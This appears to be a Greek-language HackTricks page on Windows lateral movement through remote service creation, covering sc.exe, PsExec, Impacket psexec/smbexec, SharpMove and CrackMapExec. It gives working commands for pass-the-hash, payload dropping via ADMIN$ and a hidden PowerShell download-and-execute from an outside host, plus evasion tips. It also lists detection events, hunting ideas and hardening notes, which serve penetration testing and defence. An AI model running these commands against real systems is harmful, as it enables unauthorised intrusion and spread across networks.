# PsExec/Winexec/ScExec/SMBExec

{{#include ../../banners/hacktricks-training.md}}

## Πώς λειτουργούν

Αυτές οι τεχνικές εκμεταλλεύονται τον Windows Service Control Manager (SCM) απομακρυσμένα μέσω SMB/RPC για να εκτελέσουν εντολές σε έναν στόχο. Η κοινή ροή είναι:

1. Αυθεντικοποίηση στον στόχο και πρόσβαση στο ADMIN$ share μέσω SMB (TCP/445).
2. Αντιγραφή ενός εκτελέσιμου ή καθορισμός μιας γραμμής εντολών LOLBAS που θα εκτελέσει η υπηρεσία.
3. Δημιουργία μιας υπηρεσίας απομακρυσμένα μέσω SCM (MS-SCMR μέσω \PIPE\svcctl) που δείχνει σε αυτήν την εντολή ή δυαδικό.
4. Εκκίνηση της υπηρεσίας για να εκτελέσει το payload και προαιρετικά να καταγράψει stdin/stdout μέσω ενός ονομασμένου σωλήνα.
5. Σταμάτημα της υπηρεσίας και καθαρισμός (διαγραφή της υπηρεσίας και οποιωνδήποτε ρίχτηκαν δυαδικών).

Απαιτήσεις/προαπαιτούμενα:
- Τοπικός Διαχειριστής στον στόχο (SeCreateServicePrivilege) ή ρητά δικαιώματα δημιουργίας υπηρεσίας στον στόχο.
- SMB (445) προσβάσιμο και διαθέσιμο το ADMIN$ share; Επιτρέπεται η απομακρυσμένη διαχείριση υπηρεσιών μέσω του τείχους προστασίας του υπολογιστή.
- Περιορισμοί UAC Remote: με τοπικούς λογαριασμούς, η φιλτράρισμα token μπορεί να μπλοκάρει τον διαχειριστή μέσω του δικτύου εκτός αν χρησιμοποιείται ο ενσωματωμένος Διαχειριστής ή LocalAccountTokenFilterPolicy=1.
- Kerberos vs NTLM: η χρήση ενός hostname/FQDN ενεργοποιεί το Kerberos; η σύνδεση μέσω IP συχνά επιστρέφει στο NTLM (και μπορεί να μπλοκαριστεί σε σκληρές περιβάλλοντα).

### Χειροκίνητο ScExec/WinExec μέσω sc.exe

Ακολουθεί μια ελάχιστη προσέγγιση δημιουργίας υπηρεσίας. Η εικόνα της υπηρεσίας μπορεί να είναι ένα ρίχτηκε EXE ή ένα LOLBAS όπως το cmd.exe ή το powershell.exe.
```cmd
:: Execute a one-liner without dropping a binary
sc.exe \\TARGET create HTSvc binPath= "cmd.exe /c whoami > C:\\Windows\\Temp\\o.txt" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc

:: Drop a payload to ADMIN$ and execute it (example path)
copy payload.exe \\TARGET\ADMIN$\Temp\payload.exe
sc.exe \\TARGET create HTSvc binPath= "C:\\Windows\\Temp\\payload.exe" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc
```
Σημειώσεις:
- Αναμένετε ένα σφάλμα χρονικού ορίου κατά την εκκίνηση ενός EXE που δεν είναι υπηρεσία; η εκτέλεση εξακολουθεί να συμβαίνει.
- Για να παραμείνετε πιο φιλικοί προς το OPSEC, προτιμήστε εντολές χωρίς αρχεία (cmd /c, powershell -enc) ή διαγράψτε τα αποθηκευμένα αρχεία.

Βρείτε πιο λεπτομερή βήματα στο: https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/

## Εργαλεία και παραδείγματα

### Sysinternals PsExec.exe

- Κλασικό εργαλείο διαχειριστή που χρησιμοποιεί SMB για να ρίξει το PSEXESVC.exe στο ADMIN$, εγκαθιστά μια προσωρινή υπηρεσία (προεπιλεγμένο όνομα PSEXESVC) και προξενεί I/O μέσω ονομασμένων σωλήνων.
- Παραδείγματα χρήσης:
```cmd
:: Interactive SYSTEM shell on remote host
PsExec64.exe -accepteula \\HOST -s -i cmd.exe

:: Run a command as a specific domain user
PsExec64.exe -accepteula \\HOST -u DOMAIN\user -p 'Passw0rd!' cmd.exe /c whoami /all

:: Customize the service name for OPSEC (-r)
PsExec64.exe -accepteula \\HOST -r WinSvc$ -s cmd.exe /c ipconfig
```
- Μπορείτε να εκκινήσετε απευθείας από το Sysinternals Live μέσω WebDAV:
```cmd
\\live.sysinternals.com\tools\PsExec64.exe -accepteula \\HOST -s cmd.exe /c whoami
```
OPSEC
- Αφήνει γεγονότα εγκατάστασης/απεγκατάστασης υπηρεσίας (Το όνομα υπηρεσίας συχνά PSEXESVC εκτός αν χρησιμοποιηθεί το -r) και δημιουργεί το C:\Windows\PSEXESVC.exe κατά την εκτέλεση.

### Impacket psexec.py (Παρόμοιο με PsExec)

- Χρησιμοποιεί μια ενσωματωμένη υπηρεσία παρόμοια με RemCom. Ρίχνει ένα μεταβατικό δυαδικό αρχείο υπηρεσίας (συνήθως με τυχαίο όνομα) μέσω ADMIN$, δημιουργεί μια υπηρεσία (συνήθως RemComSvc) και προξενεί I/O μέσω ενός ονομασμένου σωλήνα.
```bash
# Password auth
psexec.py DOMAIN/user:Password@HOST cmd.exe

# Pass-the-Hash
psexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST cmd.exe

# Kerberos (use tickets in KRB5CCNAME)
psexec.py -k -no-pass -dc-ip 10.0.0.10 DOMAIN/user@host.domain.local cmd.exe

# Change service name and output encoding
psexec.py -service-name HTSvc -codec utf-8 DOMAIN/user:Password@HOST powershell -nop -w hidden -c "iwr http://10.10.10.1/a.ps1|iex"
```
Artifacts
- Προσωρινό EXE στο C:\Windows\ (τυχαίοι 8 χαρακτήρες). Το όνομα της υπηρεσίας προεπιλέγεται σε RemComSvc εκτός αν παρακαμφθεί.

### Impacket smbexec.py (SMBExec)

- Δημιουργεί μια προσωρινή υπηρεσία που εκκινεί το cmd.exe και χρησιμοποιεί έναν ονομασμένο σωλήνα για I/O. Γενικά αποφεύγει την εκφόρτωση πλήρους EXE payload; η εκτέλεση εντολών είναι ημι-διαδραστική.
```bash
smbexec.py DOMAIN/user:Password@HOST
smbexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST
```
### SharpLateral και SharpMove

- [SharpLateral](https://github.com/mertdas/SharpLateral) (C#) υλοποιεί αρκετές μεθόδους πλευρικής κίνησης, συμπεριλαμβανομένης της εκτέλεσης με βάση τις υπηρεσίες.
```cmd
SharpLateral.exe redexec HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe.exe malware.exe ServiceName
```
- [SharpMove](https://github.com/0xthirteen/SharpMove) περιλαμβάνει τροποποίηση/δημιουργία υπηρεσίας για την εκτέλεση μιας εντολής απομακρυσμένα.
```cmd
SharpMove.exe action=modsvc computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true servicename=TestService
SharpMove.exe action=startservice computername=remote.host.local servicename=TestService
```
- Μπορείτε επίσης να χρησιμοποιήσετε το CrackMapExec για να εκτελέσετε μέσω διαφορετικών backends (psexec/smbexec/wmiexec):
```bash
cme smb HOST -u USER -p PASS -x "whoami" --exec-method psexec
cme smb HOST -u USER -H NTHASH -x "ipconfig /all" --exec-method smbexec
```
## OPSEC, ανίχνευση και αποδεικτικά στοιχεία

Τυπικά αποδεικτικά στοιχεία host/network όταν χρησιμοποιούνται τεχνικές παρόμοιες με το PsExec:
- Security 4624 (Logon Type 3) και 4672 (Special Privileges) στον στόχο για τον λογαριασμό διαχειριστή που χρησιμοποιήθηκε.
- Security 5140/5145 File Share και File Share Detailed events που δείχνουν πρόσβαση ADMIN$ και δημιουργία/γραφή δυαδικών αρχείων υπηρεσίας (π.χ., PSEXESVC.exe ή τυχαία 8-χαρακτήρων .exe).
- Security 7045 Service Install στον στόχο: ονόματα υπηρεσιών όπως PSEXESVC, RemComSvc, ή προσαρμοσμένα (-r / -service-name).
- Sysmon 1 (Process Create) για services.exe ή την εικόνα της υπηρεσίας, 3 (Network Connect), 11 (File Create) στο C:\Windows\, 17/18 (Pipe Created/Connected) για σωλήνες όπως \\.\pipe\psexesvc, \\.\pipe\remcom_*, ή τυχαία ισοδύναμα.
- Αποδεικτικό στοιχείο μητρώου για το EULA των Sysinternals: HKCU\Software\Sysinternals\PsExec\EulaAccepted=0x1 στον υπολογιστή του χειριστή (αν δεν έχει κατασταλεί).

Ιδέες κυνηγιού
- Ειδοποίηση για εγκαταστάσεις υπηρεσιών όπου το ImagePath περιλαμβάνει cmd.exe /c, powershell.exe, ή TEMP τοποθεσίες.
- Αναζητήστε δημιουργίες διεργασιών όπου το ParentImage είναι C:\Windows\PSEXESVC.exe ή παιδιά του services.exe που εκτελούνται ως LOCAL SYSTEM εκτελώντας κέλυφος.
- Σημειώστε ονομαστικούς σωλήνες που τελειώνουν με -stdin/-stdout/-stderr ή γνωστά ονόματα σωλήνων κλώνων του PsExec.

## Αντιμετώπιση κοινών αποτυχιών
- Η πρόσβαση απορρίπτεται (5) κατά τη δημιουργία υπηρεσιών: όχι πραγματικός τοπικός διαχειριστής, περιορισμοί UAC για τοπικούς λογαριασμούς, ή προστασία από παραχάραξη EDR στη διαδρομή δυαδικών αρχείων υπηρεσίας.
- Η διαδρομή δικτύου δεν βρέθηκε (53) ή δεν ήταν δυνατή η σύνδεση στο ADMIN$: το τείχος προστασίας μπλοκάρει SMB/RPC ή οι κοινές χρήσεις διαχειριστή είναι απενεργοποιημένες.
- Αποτυχία Kerberos αλλά το NTLM είναι μπλοκαρισμένο: συνδεθείτε χρησιμοποιώντας το hostname/FQDN (όχι IP), διασφαλίστε σωστά SPNs, ή παρέχετε -k/-no-pass με εισιτήρια όταν χρησιμοποιείτε Impacket.
- Η εκκίνηση της υπηρεσίας υπερβαίνει το χρονικό όριο αλλά το payload εκτελέστηκε: αναμενόμενο αν δεν είναι πραγματικό δυαδικό αρχείο υπηρεσίας; καταγράψτε την έξοδο σε ένα αρχείο ή χρησιμοποιήστε smbexec για ζωντανό I/O.

## Σημειώσεις σκληρύνσης (σύγχρονες αλλαγές)
- Τα Windows 11 24H2 και Windows Server 2025 απαιτούν υπογραφή SMB από προεπιλογή για εξερχόμενες (και Windows 11 εισερχόμενες) συνδέσεις. Αυτό δεν σπάει τη νόμιμη χρήση του PsExec με έγκυρες διαπιστεύσεις αλλά αποτρέπει την κακή χρήση μη υπογεγραμμένων SMB relay και μπορεί να επηρεάσει συσκευές που δεν υποστηρίζουν την υπογραφή.
- Η νέα μπλοκαρίσματος NTLM του πελάτη SMB (Windows 11 24H2/Server 2025) μπορεί να αποτρέψει την υποχώρηση NTLM κατά τη σύνδεση μέσω IP ή σε μη-Κεberos διακομιστές. Σε σκληρυνμένα περιβάλλοντα αυτό θα σπάσει το PsExec/SMBExec που βασίζεται σε NTLM; χρησιμοποιήστε Kerberos (hostname/FQDN) ή ρυθμίστε εξαιρέσεις αν είναι νόμιμα απαραίτητο.
- Αρχή της ελάχιστης προνομίας: ελαχιστοποιήστε τη συμμετοχή τοπικών διαχειριστών, προτιμήστε Just-in-Time/Just-Enough Admin, επιβάλετε LAPS, και παρακολουθήστε/ειδοποιήστε για εγκαταστάσεις υπηρεσιών 7045.

## Δείτε επίσης

- WMI-based remote exec (συχνά πιο χωρίς αρχεία):
{{#ref}}
lateral-movement/wmiexec.md
{{#endref}}

- WinRM-based remote exec:
{{#ref}}
lateral-movement/winrm.md
{{#endref}}



## Αναφορές

- PsExec - Sysinternals | Microsoft Learn: https://learn.microsoft.com/sysinternals/downloads/psexec
- Σκληρύνση ασφάλειας SMB στα Windows Server 2025 & Windows 11 (υπογραφή από προεπιλογή, μπλοκάρισμα NTLM): https://techcommunity.microsoft.com/blog/filecab/smb-security-hardening-in-windows-server-2025--windows-11/4226591
{{#include ../../banners/hacktricks-training.md}}
